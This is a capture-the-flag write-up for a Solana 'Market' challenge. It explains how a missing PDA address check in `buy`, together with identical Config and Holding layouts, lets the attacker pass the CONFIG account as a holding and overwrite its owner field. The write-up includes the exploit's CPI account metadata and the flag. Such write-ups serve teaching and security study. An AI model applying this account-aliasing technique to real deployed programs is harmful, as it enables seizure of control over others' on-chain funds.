

# Market

<img width="483" height="513" alt="image" src="https://github.com/user-attachments/assets/572b441b-0cc5-4c8d-a74f-a627dcc36678" />


## Summary

Market was a Solana program implementing a shop with user, item, holding, configuration, and treasury PDAs. The server returned the flag when the owner stored in the `CONFIG` account became my supplied user key. The `buy` instruction derived the expected holding PDA but never compared it with the account provided by the caller, allowing the configuration account to be reused as a fake holding account.

## Goal and account layouts

After running the uploaded solver program, the server deserialized the configuration PDA and checked:

```rust
if current_owner == user.pubkey() {
    let flag = fs::read_to_string("flag.txt").unwrap();
    writeln!(socket, "... {}", flag)?;
}
```

The intended `update_owner` instruction was not useful because it required a signature from the existing owner. The more interesting observation was that `Config` and `Holding` serialize to the same field sizes:

```rust
pub struct Config {
    pub owner: Pubkey,
    pub treasury: Pubkey,
    shop_item_count: u64,
}

pub struct Holding {
    owner: Pubkey,
    item: Pubkey,
    quantity: u64,
}
```

Both layouts are therefore `Pubkey || Pubkey || u64`. If a `Config` account is deserialized as a `Holding`, changing `holding.owner` changes `config.owner` at exactly the same offset.

## Vulnerability in `buy`

The function correctly derived several expected PDAs and validated the user, system configuration, treasury, and item accounts. It also derived the expected holding address:

```rust
let (holding_pda, holding_expected_bump) = Pubkey::find_program_address(
    &[user.key.as_ref(), b"HOLDING", item.key.as_ref()],
    program,
);
```

However, neither `holding_pda` nor `holding_expected_bump` was checked against the supplied `holding` account. The derived values were only used if `holding.data_is_empty()` and a new account needed to be created.

For an already initialized account, the program followed this branch:

```rust
let holding_data = &mut Holding::deserialize(
    &mut &(*holding.data).borrow_mut()[..]
)?;
holding_data.owner = *user.key;
holding_data.item = *item.key;
holding_data.quantity += 1;
holding_data.serialize(&mut &mut (*holding.data).borrow_mut()[..]).unwrap();
```

There was no address check and no semantic type discriminator. Solana also permits the same account to appear more than once in an instruction. I could therefore pass the `CONFIG` PDA once as `system_config` and again as `holding`.

## Exploit construction

The uploaded solver performed three CPIs to the market program in a single transaction.

First, it created the required user PDA using `InitializeUser`. The seed was the server-provided user key followed by `USER`:

```rust
let (_, user_bump) = Pubkey::find_program_address(
    &[user.key.as_ref(), b"USER"],
    market.key,
);
```

Second, it deposited 5 SOL into the user PDA. This was the exact cost of the shell item, whose item index was `4919`.

Finally, it invoked `Buy` with the following logical account order:

```text
user
user_config
CONFIG          <- legitimate system_config
VAULT
CONFIG          <- malicious holding alias
SHELL
system_program
```

The essential CPI account metadata was:

```rust
vec![
    AccountMeta::new(*user.key, true),
    AccountMeta::new(*user_config.key, false),
    AccountMeta::new(*config.key, false),
    AccountMeta::new(*treasury.key, false),
    AccountMeta::new(*config.key, false),
    AccountMeta::new(*shell.key, false),
    AccountMeta::new_readonly(*system.key, false),
]
```

Because `CONFIG` was already initialized, `buy` skipped holding creation, deserialized those bytes as `Holding`, and overwrote the first 32 bytes with my user public key. Those bytes were also `Config.owner`. The purchase completed normally and the server's final ownership check succeeded.

The complete solver components are [solver/src/lib.rs](solver/src/lib.rs) and [solve_remote.py](solve_remote.py). The Rust program carries out the three CPIs; the Python wrapper uploads the compiled SBF program, derives the required PDAs, and sends the account metas expected by the challenge framework.

## Verification

The server printed the new owner and returned:

```text
Did you just steal the market from ME?? I SHALL BE BACK!: scriptCTF{w41t_4_s3c0nd_wh0_4r3_y0u???_60aff1437947}
```

## Flag

```text
scriptCTF{w41t_4_s3c0nd_wh0_4r3_y0u???_60aff1437947}
```
